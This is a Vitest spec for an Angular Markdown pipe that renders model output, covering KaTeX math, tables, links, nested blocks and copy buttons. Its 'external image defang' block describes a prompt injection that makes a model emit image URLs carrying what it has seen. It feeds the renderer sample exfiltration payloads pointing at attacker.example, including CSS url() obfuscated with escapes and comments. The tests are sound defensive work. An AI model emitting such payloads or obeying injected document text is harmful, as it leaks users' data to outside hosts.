import type { MockedObject } from "vitest";
import { MarkdownPipe } from './markdown.pipe';
import { DomSanitizer } from '@angular/platform-browser';
import { KatexLoaderService } from '../services/katex-loader.service';

describe('MarkdownPipe', () => {
  let pipe: MarkdownPipe;
  let mockSanitizer: MockedObject<DomSanitizer>;
  let loader: KatexLoaderService;

  beforeAll(async () => {
    loader = new KatexLoaderService();
    await loader.load();
  });

  beforeEach(() => {
    mockSanitizer = {
      bypassSecurityTrustHtml: vi.fn().mockName("DomSanitizer.bypassSecurityTrustHtml")
    } as unknown as MockedObject<DomSanitizer>;
    mockSanitizer.bypassSecurityTrustHtml.mockImplementation((html: string) => html as any);
    pipe = new MarkdownPipe(mockSanitizer, loader);
  });

  it('returns the previous result while the input is unchanged', () => {
    pipe.transform('Same **text**.');
    pipe.transform('Same **text**.');
    expect(mockSanitizer.bypassSecurityTrustHtml).toHaveBeenCalledTimes(1);

    pipe.transform('Other text.');
    expect(mockSanitizer.bypassSecurityTrustHtml).toHaveBeenCalledTimes(2);
  });

  it('should insert newlines before and after squished code blocks', () => {
    const input = 'overlong lines.```c\nint main() {}\n```Done.';
    const result = pipe.transform(input);
    // Should contain a <pre><code> block, not raw backticks
    expect(result).toContain('<pre>');
    expect(result).toContain('<code');
    expect(result).not.toContain('```');
  });

  it('should leave a line that already starts with a heading marker alone', () => {
    const h2 = pipe.transform('## Title') as string;
    expect(h2.match(/<h2[^>]*>Title<\/h2>/g)!.length).toBe(1);
    expect(h2).not.toMatch(/<h1[^>]*>\s*<\/h1>/);
    expect(h2).not.toContain('<h1');

    const h3 = pipe.transform('### Sub') as string;
    expect(h3.match(/<h3[^>]*>Sub<\/h3>/g)!.length).toBe(1);
    expect(h3).not.toContain('<h1');
    expect(h3).not.toContain('<h2');
  });

  it('should still split a heading glued to preceding text', () => {
    const result = pipe.transform('TEXT#### HEADING') as string;
    expect(result).toContain('TEXT');
    expect(result).toMatch(/<h4[^>]*>HEADING<\/h4>/);
  });

  it('should render LaTeX display math \\[ ... \\] with KaTeX', () => {
    const input = `The GnollHack score formula is:

\\[
\\textbf{Score} = \\text{BaseScore} \\times \\text{AscensionMultiplier} \\times \\text{DifficultyMultiplier} \\times \\text{ModernMultiplier}
\\]

Where:`;
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).toContain('katex-html');
    expect(result).toContain('Score');
    expect(result).not.toContain('\\[');
    expect(result).not.toContain('\\]');
  });

  it('should render inline LaTeX math \\( ... \\) with KaTeX', () => {
    const input = 'Here is inline math \\( E = mc^2 \\) in text.';
    const result = pipe.transform(input);
    expect(result).toContain('katex');
    expect(result).not.toContain('\\( E = mc^2 \\)');
  });

  it('should render double dollar $$ ... $$ display math with KaTeX', () => {
    const input = '$$ a^2 + b^2 = c^2 $$';
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).not.toContain('$$');
  });

  it('should render single dollar $ ... $ inline math with KaTeX', () => {
    const input = 'The value $x = 42$ is true.';
    const result = pipe.transform(input);
    expect(result).toContain('katex');
    expect(result).not.toContain('$x = 42$');
  });

  it('should not treat currency amounts as math', () => {
    const input = 'The item costs $50 now and $100 later.';
    const result = pipe.transform(input);
    expect(result).toContain('$50');
    expect(result).toContain('$100');
    expect(result).not.toContain('katex');
  });

  it('should protect math expressions containing dots from squished sentence splitting', () => {
    const input = '\\[ \\text{Score.Total} = 100 \\]';
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).not.toContain('\n\nTotal');
  });

  it('should render complex LaTeX array formula table', () => {
    const input = `Understood.

\\[
C = 3.5\\,\\mathrm{lb}\\,(S+\\mathrm{Con}) + 3\\,\\mathrm{lb}
\\]

where \\(C\\) is carrying capacity, \\(S\\) is Strength, and \\(\\mathrm{Con}\\) is Constitution.

Let \\(E\\) represent current carried weight:

\\[
\\begin{array}{c|c|c}
\\text{Encumbrance level} & \\text{Condition} & \\text{Movement speed} \\\\ \\hline
\\text{Unencumbered} & E \\le C & 1 \\\\[2pt]
\\text{Burdened} & C < E < 1.5C & \\frac{3}{4} \\\\[2pt]
\\text{Stressed} & 1.5C \\le E < 2C & \\frac{1}{2} \\\\[2pt]
\\text{Strained} & 2C \\le E < 2.5C & \\frac{1}{4} \\\\[2pt]
\\text{Overtaxed} & 2.5C \\le E < 3C & \\frac{1}{8} \\\\[2pt]
\\text{Overloaded} & E \\ge 3C & \\text{Cannot move}
\\end{array}
\\]`;
    const result = pipe.transform(input);
    expect(result).toContain('Encumbrance level');
    expect(result).toContain('Unencumbered');
    expect(result).toContain('Cannot move');

    // Mount to DOM to test actual browser rendering
    const container = document.createElement('div');
    container.className = 'markdown-body';
    container.innerHTML = result as string;
    document.body.appendChild(container);

    const katexHtmls = container.querySelectorAll('.katex-html');
    expect(katexHtmls.length).toBe(6); // 2 display formulas + 4 inline math

    const arrayFormula = katexHtmls[5] as HTMLElement;
    const normalizedText = arrayFormula.innerText.replace(/\u00a0/g, ' ');
    expect(normalizedText).toContain('Encumbrance level');
    expect(normalizedText).toContain('Unencumbered');
    expect(normalizedText).toContain('Burdened');
    expect(normalizedText).toContain('Cannot move');

    document.body.removeChild(container);
  });

  it('should render display math with single newline before bracket and \\dfrac / \\leq', () => {
    const input = `Yes—this is a clearer format. A polished version is:
\\[
\\begin{array}{c|c|c}
\\text{State} & \\text{Condition} & \\text{Movement speed} \\\\ \\hline
\\text{Unencumbered}
    & E \\leq C
    & 1 \\\\[2pt]
\\text{Burdened}
    & C < E < 1.5C
    & \\dfrac{3}{4} \\\\[2pt]
\\text{Stressed}
    & 1.5C \\leq E < 2C
    & \\dfrac{1}{2} \\\\[2pt]
\\text{Strained}
    & 2C \\leq E < 2.5C
    & \\dfrac{1}{4} \\\\[2pt]
\\text{Overtaxed}
    & 2.5C \\leq E < 3C
    & \\dfrac{1}{8} \\\\[2pt]
\\text{Overloaded}
    & E \\geq 3C
    & \\text{Cannot move}
\\end{array}
\\]
Here, \\(E\\) denotes carried weight and \\(C\\) denotes carrying capacity.`;
    const result = pipe.transform(input);
    expect(result).not.toContain('<p>Yes—this is a clearer format. A polished version is: <span class="katex-display">');
    expect(result).toContain('State');
    expect(result).toContain('Unencumbered');
    expect(result).toContain('Cannot move');

    const container = document.createElement('div');
    container.className = 'markdown-body';
    container.innerHTML = result as string;
    document.body.appendChild(container);

    const katexHtmls = container.querySelectorAll('.katex-html');
    expect(katexHtmls.length).toBe(3); // 1 display array + 2 inline (E, C)

    const arrayFormula = katexHtmls[0] as HTMLElement;
    const normalizedText = arrayFormula.innerText.replace(/\u00a0/g, ' ');
    expect(normalizedText).toContain('State');
    expect(normalizedText).toContain('Unencumbered');
    expect(normalizedText).toContain('Cannot move');

    document.body.removeChild(container);
  });

  it('should render bare \\begin{array} environments without outer brackets', () => {
    const input = `Here is a matrix:
\\begin{array}{cc}
1 & 2 \\\\
3 & 4
\\end{array}
End of matrix.`;
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).toContain('katex-html');
  });

  it('should render markdown tables with numeric colons without breaking rows', () => {
    const input = `GnollHack keeps NetHack’s core deity-prayer system.

| Aspect | GnollHack | NetHack |
|---|---|---|
| **How to pray** | Use **Pray** (\`Alt+P\`). | Use the \`#pray\` extended command. |
| **Initial timeout** | **Priests: 150 turns**; other roles: **300 turns**. | **300 turns** for everyone. |
| **Timeout after praying** | Randomized from a base of **175 turns for priests** or **350 for other roles**. | Uses the classic randomized timeout. |
| **Safety thresholds** | Major trouble: timeout ≤200; minor trouble: ≤100; no trouble: 0. | Essentially the same thresholds. |
| **Feedback** | A blessed **holy symbol or prayerstone can shimmer** when prayer is safe. | You generally use **enlightenment** to check whether prayer is safe. |
| **Altar effects** | Your altar can bless water, holy symbols, and prayerstones. | Your altar can bless water. |
| **Troubles and favors** | Uses an expanded list of major/minor troubles. | Uses the traditional NetHack trouble and favor system. |

The largest mechanical advantage is that priests can pray sooner.`;

    const result = pipe.transform(input);
    const container = document.createElement('div');
    container.innerHTML = result as string;

    const tables = container.querySelectorAll('table');
    expect(tables.length).toBe(1);

    const rows = container.querySelectorAll('table tr');
    // 1 header row + 7 data rows = 8 rows
    expect(rows.length).toBe(8);

    // Verify row 4 (Safety thresholds) contains both cells intact
    const row4Cells = rows[4].querySelectorAll('td');
    expect(row4Cells.length).toBe(3);
    expect(row4Cells[0].textContent).toContain('Safety thresholds');
    expect(row4Cells[1].textContent).toContain('no trouble: 0.');
    expect(row4Cells[2].textContent).toContain('Essentially the same thresholds.');

    // Verify row 5 (Feedback) is inside the table
    const row5Cells = rows[5].querySelectorAll('td');
    expect(row5Cells.length).toBe(3);
    expect(row5Cells[0].textContent).toContain('Feedback');
  });

  it('should format squished lists in non-table text while preserving tables', () => {
    const nonTableInput = 'Here are the options:1. First item 2. Second item';
    const nonTableResult = pipe.transform(nonTableInput) as string;
    expect(nonTableResult).toContain('<ol>');
    expect(nonTableResult).toContain('<li>First item');

    const tableInput = `| Col 1 | Col 2 |
|---|---|
| Options: 1. Item | Plain value: 0. |`;
    const tableResult = pipe.transform(tableInput) as string;
    expect(tableResult).toContain('<table>');
    expect(tableResult).toContain('<td>Options: 1. Item</td>');
    expect(tableResult).toContain('<td>Plain value: 0.</td>');
  });

  it('should space squished sentences inside table cells without breaking the table', () => {
    const input = `| Column 1 | Column 2 |
|---|---|
| First cell.Next sentence in same cell | Second cell |`;
    const result = pipe.transform(input) as string;
    const container = document.createElement('div');
    container.innerHTML = result;

    const tables = container.querySelectorAll('table');
    expect(tables.length).toBe(1);

    const cells = container.querySelectorAll('table td');
    expect(cells.length).toBe(2);
    expect(cells[0].textContent).toContain('First cell. Next sentence in same cell');
  });

  describe('dotted names and the squished sentence heuristic', () => {
    const render = (input: string): HTMLDivElement => {
      const container = document.createElement('div');
      container.innerHTML = pipe.transform(input) as string;
      return container;
    };

    it('keeps a bold WinUI/.NET 10 in one strong element and one paragraph', () => {
      const container = render('**WinUI/.NET 10**');
      expect(container.querySelectorAll('p').length).toBe(1);
      const strong = container.querySelectorAll('strong');
      expect(strong.length).toBe(1);
      expect(strong[0].textContent).toBe('WinUI/.NET 10');
      expect(container.innerHTML).not.toContain('**');
    });

    it('keeps a sentence mentioning WinUI/.NET 10 in one paragraph', () => {
      const container = render('running on **WinUI/.NET 10**, with Developer Mode');
      expect(container.querySelectorAll('p').length).toBe(1);
      expect(container.querySelector('strong')!.textContent).toBe('WinUI/.NET 10');
    });

    for (const input of ['C#/.NET', 'built on.NET 8', '".NET"', "the .NET's runtime", 'ASP.NET', '**.NET** runtime', '(.NET)', 'WinUI.NET10']) {
      it(`does not split ${input}`, () => {
        const container = render(input);
        expect(container.querySelectorAll('p').length).toBe(1);
        expect(container.textContent).toContain('NET');
      });
    }

    it('still splits a glued sentence', () => {
      expect(render('word.Next word').querySelectorAll('p').length).toBe(2);
    });

    it('still splits a glued sentence that starts with a word beginning NET', () => {
      const paragraphs = render('was fine.NETWORK errors followed').querySelectorAll('p');
      expect(paragraphs.length).toBe(2);
      expect(paragraphs[1].textContent).toBe('NETWORK errors followed');
    });

    it('does not space WinUI/.NET inside a table cell', () => {
      const container = render(`| Platform | Status |
|---|---|
| WinUI/.NET 10 | Active |`);
      expect(container.querySelectorAll('table').length).toBe(1);
      expect(container.querySelectorAll('table td')[0].textContent).toBe('WinUI/.NET 10');
    });
  });

  /* External-image defang.

     What is being defended: a prompt injection inside an uploaded document can induce the
     model to emit an image whose URL carries what it has seen, and the browser fetches it on
     render. The CSP blocks the request; these tests cover the layer that tells the user, and
     the routes the renderer alone would miss. */
  describe('external image defang', () => {
    const render = (input: string): HTMLDivElement => {
      const container = document.createElement('div');
      container.innerHTML = pipe.transform(input) as string;
      return container;
    };

    it('renders an external markdown image as a blocked badge and issues no request', () => {
      const container = render('![secret](https://attacker.example/leak?q=secret)');

      expect(container.querySelectorAll('img').length).toBe(0);

      const badge = container.querySelector('.blocked-external-image');
      expect(badge).toBeTruthy();
      expect(badge!.textContent).toContain('External image blocked');
      // The alt text is kept so the user can see what the model claimed the image was.
      expect(badge!.textContent).toContain('secret');
    });

    it('leaves a same-origin absolute image intact', () => {
      const container = render(`![avatar](${window.location.origin}/img/avatar.webp)`);

      const images = container.querySelectorAll('img');
      expect(images.length).toBe(1);
      expect(images[0].getAttribute('src')).toBe(`${window.location.origin}/img/avatar.webp`);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('leaves a root-relative image intact', () => {
      const container = render('![board](/img/board.webp)');

      const images = container.querySelectorAll('img');
      expect(images.length).toBe(1);
      expect(images[0].getAttribute('src')).toBe('/img/board.webp');
    });

    it('leaves a relative image intact', () => {
      const container = render('![board](img/board.webp)');

      expect(container.querySelectorAll('img').length).toBe(1);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('leaves a data: image intact, because it carries its own bytes', () => {
      const gif = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
      const container = render(`![pixel](${gif})`);

      expect(container.querySelectorAll('img').length).toBe(1);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('blocks a protocol-relative image, which is external however the page is served', () => {
      const container = render('![x](//attacker.example/leak.png)');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('blocks a raw <img> in the model output, which never reaches the markdown renderer', () => {
      const container = render('Here you go: <img src="https://attacker.example/leak?q=secret">');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('blocks a raw <img> whose only external reference is in srcset', () => {
      const container = render(
        '<img src="/img/board.webp" srcset="https://attacker.example/leak.png 2x">');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('strips a style attribute that can fetch a resource', () => {
      const container = render(
        '<div style="background-image:url(https://attacker.example/leak.png)">text</div>');

      const div = container.querySelector('div');
      expect(div).toBeTruthy();
      expect(div!.getAttribute('style')).toBeNull();
      expect(div!.textContent).toContain('text');
    });

    it('strips a style attribute hiding url() behind CSS escapes and comments', () => {
      const escaped = render('<div style="background:\\75 rl(https://attacker.example/a.png)">a</div>');
      expect(escaped.querySelector('div')!.getAttribute('style')).toBeNull();

      const commented = render('<div style="background:ur/**/l(https://attacker.example/b.png)">b</div>');
      expect(commented.querySelector('div')!.getAttribute('style')).toBeNull();
    });

    it('keeps a style attribute that cannot fetch anything, so KaTeX still renders', () => {
      const container = render('<span style="height:0.8em;vertical-align:-0.1em">x</span>');

      expect(container.querySelector('span')!.getAttribute('style')).toContain('height');
    });

    it('still renders math, whose glyph metrics depend on inline styles', () => {
      const result = pipe.transform('$$ a^2 + b^2 = c^2 $$') as string;

      expect(result).toContain('katex-display');
      expect(result).toContain('style=');
    });

    it('does not touch a linked image reference inside a code block', () => {
      const result = pipe.transform('```\n![x](https://attacker.example/leak.png)\n```') as string;

      // Inside a fence it is text, not an image, and must survive verbatim.
      expect(result).toContain('attacker.example');
      expect(result).not.toContain('blocked-external-image');
    });
  });

  /* An external link opens in a new tab without access to the opener; a link within this site
     navigates in place. */
  describe('external links', () => {
    const render = (input: string): HTMLDivElement => {
      const container = document.createElement('div');
      container.innerHTML = pipe.transform(input) as string;
      return container;
    };

    it('opens an external markdown link in a new tab', () => {
      const link = render('[x](https://example.com)').querySelector('a');

      expect(link).toBeTruthy();
      expect(link!.getAttribute('href')).toBe('https://example.com');
      expect(link!.getAttribute('target')).toBe('_blank');
      expect(link!.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('opens an external raw <a> in the model output in a new tab', () => {
      const link = render('See <a href="https://example.com">this</a>.').querySelector('a');

      expect(link).toBeTruthy();
      expect(link!.getAttribute('target')).toBe('_blank');
      expect(link!.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('leaves a root-relative link to navigate in place', () => {
      const link = render('[settings](/settings)').querySelector('a');

      expect(link).toBeTruthy();
      expect(link!.getAttribute('target')).toBeNull();
      expect(link!.getAttribute('rel')).toBeNull();
    });

    it('leaves a same-origin absolute link to navigate in place', () => {
      const link = render(`[settings](${window.location.origin}/settings)`).querySelector('a');

      expect(link).toBeTruthy();
      expect(link!.getAttribute('href')).toBe(`${window.location.origin}/settings`);
      expect(link!.getAttribute('target')).toBeNull();
      expect(link!.getAttribute('rel')).toBeNull();
    });
  });

  /* A fence or display math that starts a line inside a quote or list item stays in it. */
  describe('blocks nested in quotes and list items', () => {
    const render = (input: string): HTMLDivElement => {
      const container = document.createElement('div');
      container.innerHTML = pipe.transform(input) as string;
      return container;
    };

    const childTags = (element: Element) => Array.from(element.children).map(c => c.tagName);

    it('keeps a fence that fills a quote inside it', () => {
      const root = render('> ```\n> code\n> ```');

      expect(root.querySelectorAll('blockquote').length).toBe(1);
      expect(root.querySelector('blockquote > pre')).toBeTruthy();
      expect(root.querySelector('code')!.textContent).toBe('code\n');
    });

    it('keeps a fence between quoted text lines inside the quote', () => {
      const root = render('> Intro:\n> ```py\n> x = 1\n> ```\n> After.');
      const quotes = root.querySelectorAll('blockquote');

      expect(quotes.length).toBe(1);
      expect(childTags(quotes[0])).toEqual(['P', 'PRE', 'P']);
      expect(root.querySelector('code')!.textContent).toBe('x = 1\n');
    });

    it('keeps a fence inside a loose list item', () => {
      const root = render('- item\n\n  ```py\n  x = 1\n  ```\n- next');
      const lists = root.querySelectorAll('ul');

      expect(lists.length).toBe(1);
      const items = lists[0].querySelectorAll(':scope > li');
      expect(items.length).toBe(2);
      expect(items[0].querySelector('pre')).toBeTruthy();
      expect(root.querySelector('code')!.textContent).toBe('x = 1\n');
    });

    it('keeps a fence inside a tight ordered list item', () => {
      const root = render('1. Run:\n   ```bash\n   cmd\n   ```\n2. Done');
      const lists = root.querySelectorAll('ol');

      expect(lists.length).toBe(1);
      expect(lists[0].hasAttribute('start')).toBe(false);
      const items = lists[0].querySelectorAll(':scope > li');
      expect(items.length).toBe(2);
      expect(items[0].querySelector('pre')).toBeTruthy();
      expect(root.querySelector('code')!.textContent).toBe('cmd\n');
    });

    it('keeps a fence right after a list marker inside the item', () => {
      const root = render('1. ```bash\n   cmd\n   ```\n2. Done');
      const lists = root.querySelectorAll('ol');

      expect(lists.length).toBe(1);
      expect(lists[0].hasAttribute('start')).toBe(false);
      const items = lists[0].querySelectorAll(':scope > li');
      expect(items.length).toBe(2);
      expect(items[0].querySelector('pre')).toBeTruthy();
      expect(root.querySelector('code')!.textContent).toBe('cmd\n');
    });

    it('keeps display math after a quoted text line inside the quote', () => {
      const root = render('> Formula:\n> \\[\n> x^2\n> \\]\n> End');
      const quotes = root.querySelectorAll('blockquote');

      expect(quotes.length).toBe(1);
      expect(childTags(quotes[0])).toEqual(['P', 'SPAN', 'P']);
      expect(quotes[0].children[1].classList.contains('katex-display')).toBe(true);
      expect(root.querySelectorAll('.katex-display').length).toBe(1);
    });

    it('keeps a quoted formula line that looks like a list item in the formula', () => {
      const root = render('> Formula:\n> \\[\n> a = b\n> - c\n> \\]\n> End');

      expect(root.querySelectorAll('blockquote').length).toBe(1);
      expect(root.querySelector('ul')).toBeNull();
      expect(root.querySelectorAll('.katex-display').length).toBe(1);
      expect(root.querySelector('annotation')!.textContent).toBe('a = b\n- c');
    });

    it('keeps display math inside a tight ordered list item', () => {
      const root = render('1. Compute:\n   \\[\n   d = a\n   + 3\n   \\]\n2. Done');
      const lists = root.querySelectorAll('ol');

      expect(lists.length).toBe(1);
      const items = lists[0].querySelectorAll(':scope > li');
      expect(items.length).toBe(2);
      expect(items[0].querySelector('.katex-display')).toBeTruthy();
      expect(root.querySelector('annotation')!.textContent).toBe('d = a\n+ 3');
    });

    it('still pads a fence glued to text after inline code', () => {
      const root = render('Use `foo` ```sh\nls\n```\nDone');
      const blocks = root.querySelectorAll('pre');

      expect(blocks.length).toBe(1);
      expect(blocks[0].querySelector('code')!.textContent).toBe('ls\n');
      expect(root.textContent).not.toContain('```');
    });

    it('still pads display math that follows display math on one line', () => {
      const root = render('\\[ a \\] \\[ b \\]');
      const formulas = Array.from(root.querySelectorAll('.katex-display'));

      expect(formulas.length).toBe(2);
      for (const formula of formulas) {
        expect(formula.parentElement).toBe(root);
      }
    });
  });

  describe('quote copy', () => {
    function renderQuotes(markdown: string, feature: 'copy-buttons' | null = 'copy-buttons'): HTMLElement {
      const container = document.createElement('div');
      container.className = 'markdown-body';
      container.innerHTML = pipe.transform(markdown, feature) as string;
      return container;
    }

    const buttons = (root: HTMLElement) => Array.from(root.querySelectorAll<HTMLButtonElement>('.md-quote-copy-btn'));

    it('adds nothing without the feature', () => {
      const root = renderQuotes('> quoted', null);

      expect(root.querySelector('blockquote')).toBeTruthy();
      expect(root.querySelector('[class*="md-quote-copy"]')).toBeNull();
      expect(root.querySelector('[data-md-quote]')).toBeNull();
      expect(root.querySelector('.md-quote-copyable')).toBeNull();
    });

    it('gives a quote one button that copies its Markdown without the quote markers', () => {
      const root = renderQuotes('> **Bold** line\n> - item\n>\n> para');
      const all = buttons(root);

      expect(all.length).toBe(1);
      const button = all[0];
      expect(button.getAttribute('data-md-quote-text')).toBe('**Bold** line\n- item\n\npara');
      expect(button.getAttribute('type')).toBe('button');
      expect(button.hasAttribute('aria-hidden')).toBe(false);
      expect(button.hasAttribute('hidden')).toBe(false);
      expect(button.hasAttribute('inert')).toBe(false);

      const status = button.nextElementSibling as HTMLElement;
      expect(status.getAttribute('role')).toBe('status');
      expect(status.textContent).toBe('');

      const quote = root.querySelector('blockquote')!;
      expect(quote.classList.contains('md-quote-copyable')).toBe(true);
      const tip = quote.querySelector(`[id="${button.getAttribute('interestfor')}"]`);
      expect(tip).toBeTruthy();
      expect(tip!.getAttribute('popover')).toBe('hint');
      expect(root.querySelector('[data-md-quote]')).toBeNull();
    });

    it('gives a nested quote no button of its own; the outer one copies both', () => {
      const root = renderQuotes('> outer\n> > inner');
      const all = buttons(root);

      expect(root.querySelectorAll('blockquote').length).toBe(2);
      expect(all.length).toBe(1);
      expect(all[0].closest('blockquote')!.parentElement).toBe(root);
      expect(all[0].getAttribute('data-md-quote-text')).toBe('outer\n> inner');
    });

    it('names the first quote plainly and numbers the rest in the accessible name', () => {
      expect(buttons(renderQuotes('> only'))[0].getAttribute('aria-label')).toBe('Copy quote as Markdown');

      const two = buttons(renderQuotes('> first\n\nBetween.\n\n> second'));
      expect(two.map(b => b.getAttribute('aria-label'))).toEqual(['Copy quote as Markdown', 'Copy quote 2 as Markdown']);
      expect(two.map(b => b.getAttribute('data-md-quote-text'))).toEqual(['first', 'second']);
    });

    it('never numbers a quote tooltip', () => {
      const root = renderQuotes('> first\n\nOne.\n\n> second\n\nTwo.\n\n> third');
      const all = buttons(root);

      expect(all.length).toBe(3);
      const tips = all.map(b => root.querySelector(`[id="${b.getAttribute('interestfor')}"]`)!.textContent);
      expect(tips).toEqual(['Copy quote as Markdown', 'Copy quote as Markdown', 'Copy quote as Markdown']);
      expect(all[2].getAttribute('aria-label')).toBe('Copy quote 3 as Markdown');
    });

    it('gives a quote inside a list item a button', () => {
      const all = buttons(renderQuotes('- item\n\n  > quoted in a list'));

      expect(all.length).toBe(1);
      expect(all[0].closest('li')).toBeTruthy();
      expect(all[0].getAttribute('data-md-quote-text')).toBe('quoted in a list');
    });

    it('removes controls and quote tags that came from the model', () => {
      const root = renderQuotes(
        'Text <button class="md-quote-copy-btn" data-md-quote-text="evil">x</button> ' +
        '<span class="md-quote-copy-status" role="status">Copied</span>\n\n' +
        '<blockquote data-md-quote="00000000-0000-0000-0000-000000000000-0">forged</blockquote>');

      expect(root.querySelector('[class*="md-quote-copy"]')).toBeNull();
      expect(root.querySelector('[data-md-quote-text]')).toBeNull();
      expect(root.querySelector('[data-md-quote]')).toBeNull();
      expect(root.textContent).toContain('forged');
    });

    it('keeps the real button beside a forged one', () => {
      const root = renderQuotes(
        '<button class="action-btn md-quote-copy-btn" data-md-quote-text="evil">x</button>\n\n> real');
      const all = buttons(root);

      expect(all.length).toBe(1);
      expect(all[0].getAttribute('data-md-quote-text')).toBe('real');
    });

    it('carries quotes, ampersands and markup in the copied text unchanged', () => {
      const button = buttons(renderQuotes('> a "quote" & <b>x</b>'))[0];

      expect(button.getAttribute('data-md-quote-text')).toBe('a "quote" & <b>x</b>');
    });

    it('renders again when only the feature changes', () => {
      const withFeature = pipe.transform('> quoted', 'copy-buttons');
      const without = pipe.transform('> quoted', null);

      expect(withFeature).not.toEqual(without);
      expect(without as string).not.toContain('md-quote-copy');
    });

    it('copies CRLF input with LF line endings', () => {
      expect(buttons(renderQuotes('> a\r\n> b'))[0].getAttribute('data-md-quote-text')).toBe('a\nb');
    });
  });

  describe('code copy', () => {
    function renderCode(markdown: string, feature: 'copy-buttons' | null = 'copy-buttons'): HTMLElement {
      const container = document.createElement('div');
      container.className = 'markdown-body';
      container.innerHTML = pipe.transform(markdown, feature) as string;
      return container;
    }

    const buttons = (root: HTMLElement) => Array.from(root.querySelectorAll<HTMLButtonElement>('.md-code-copy-btn'));
    const tipOf = (root: HTMLElement, button: HTMLButtonElement) =>
      root.querySelector(`[id="${button.getAttribute('interestfor')}"]`);
    const labels = (markdown: string) => {
      const root = renderCode(markdown);
      return buttons(root).map(b => ({ aria: b.getAttribute('aria-label'), tip: tipOf(root, b)!.textContent }));
    };

    const CODE = 'function f(a: string) {\n  if (a < "b" && a) {\n\n    return 1;\n  }\n}';

    it('adds nothing without the feature', () => {
      const root = renderCode('```ts\nconst x = 1;\n```', null);

      expect(root.querySelector('pre > code.language-ts')).toBeTruthy();
      expect(root.querySelector('.md-code-copyable')).toBeNull();
      expect(root.querySelector('[class*="md-code-copy"]')).toBeNull();
      expect(root.querySelector('[data-md-code]')).toBeNull();
    });

    it('gives a code block one button that copies its code verbatim', () => {
      const root = renderCode('Intro.\n\n```ts\n' + CODE + '\n```');
      const all = buttons(root);

      expect(all.length).toBe(1);
      const button = all[0];
      const wrapper = root.querySelector('.md-code-copyable')!;
      expect(wrapper.tagName).toBe('DIV');
      expect(button.closest('.md-code-copyable')).toBe(wrapper);
      expect(root.querySelector('pre')!.parentElement).toBe(wrapper);

      expect(button.getAttribute('data-md-code-text')).toBe(CODE);
      expect(button.getAttribute('type')).toBe('button');
      expect(button.children.length).toBe(2);
      for (const child of Array.from(button.children)) {
        expect(child.tagName.toLowerCase()).toBe('svg');
        expect(child.getAttribute('aria-hidden')).toBe('true');
      }
      expect(button.textContent).toBe('');
      expect(button.hasAttribute('aria-hidden')).toBe(false);
      expect(button.hasAttribute('hidden')).toBe(false);
      expect(button.hasAttribute('inert')).toBe(false);

      const status = button.nextElementSibling as HTMLElement;
      expect(status.getAttribute('role')).toBe('status');
      expect(status.textContent).toBe('');

      const tip = tipOf(root, button);
      expect(tip).toBeTruthy();
      expect(tip!.getAttribute('popover')).toBe('hint');
      expect(root.querySelector('[data-md-code]')).toBeNull();
    });

    it('leaves the code block markup itself unchanged', () => {
      const markdown = '```ts\n' + CODE + '\n```';
      const plain = renderCode(markdown, null).querySelector('pre')!.outerHTML;
      const withButton = renderCode(markdown).querySelector('pre')!.outerHTML;

      expect(withButton).toBe(plain);
    });

    it('copies an indented code block without its indent', () => {
      const all = buttons(renderCode('Para.\n\n    indented line\n      more'));

      expect(all.length).toBe(1);
      expect(all[0].getAttribute('data-md-code-text')).toBe('indented line\n  more');
    });

    it('gives a code block inside a quote no button; the quote copies it', () => {
      const root = renderCode('> Quoted:\n>\n>     code line');

      expect(root.querySelector('blockquote pre')).toBeTruthy();
      expect(buttons(root).length).toBe(0);
      expect(root.querySelector('.md-code-copyable')).toBeNull();
      expect(root.querySelector('.md-quote-copy-btn')!.getAttribute('data-md-quote-text')).toBe('Quoted:\n\n    code line');
    });

    it('gives a code block inside a list item a button', () => {
      const all = buttons(renderCode('- item\n\n      x = 1'));

      expect(all.length).toBe(1);
      expect(all[0].closest('li')).toBeTruthy();
      expect(all[0].getAttribute('data-md-code-text')).toBe('x = 1');
    });

    it('gives a fenced block inside a quote no button; the quote copies it with its fence', () => {
      const root = renderCode('> ```\n> code\n> ```');

      expect(buttons(root).length).toBe(0);
      expect(root.querySelector('.md-code-copyable')).toBeNull();
      expect(root.querySelector('.md-quote-copy-btn')!.getAttribute('data-md-quote-text')).toBe('```\ncode\n```');
    });

    it('gives a fenced block inside a list item a button', () => {
      const all = buttons(renderCode('- item\n\n  ```py\n  x = 1\n  ```'));

      expect(all.length).toBe(1);
      expect(all[0].closest('li')).toBeTruthy();
      expect(all[0].getAttribute('data-md-code-text')).toBe('x = 1');
    });

    it('names a known language in the tooltip and the accessible name', () => {
      expect(labels('```python\nx = 1\n```')).toEqual([{ aria: 'Copy Python code', tip: 'Copy Python code' }]);
    });

    it('names an unknown or missing language plainly', () => {
      expect(labels('```\nx\n```')).toEqual([{ aria: 'Copy code', tip: 'Copy code' }]);
      expect(labels('```no-such-lang\nx\n```')).toEqual([{ aria: 'Copy code', tip: 'Copy code' }]);
    });

    it('reads only the first word of the info string, in any case', () => {
      expect(labels('```PY extra words\nx = 1\n```')).toEqual([{ aria: 'Copy Python code', tip: 'Copy Python code' }]);
    });

    it('numbers a repeated name in the accessible name only', () => {
      expect(labels('```py\na = 1\n```\n\nThen:\n\n```python\nb = 2\n```')).toEqual([
        { aria: 'Copy Python code', tip: 'Copy Python code' },
        { aria: 'Copy Python code 2', tip: 'Copy Python code' }
      ]);
    });

    it('numbers nothing when the names differ', () => {
      expect(labels('```py\na = 1\n```\n\nThen:\n\n```sql\nselect 1;\n```')).toEqual([
        { aria: 'Copy Python code', tip: 'Copy Python code' },
        { aria: 'Copy SQL code', tip: 'Copy SQL code' }
      ]);
    });

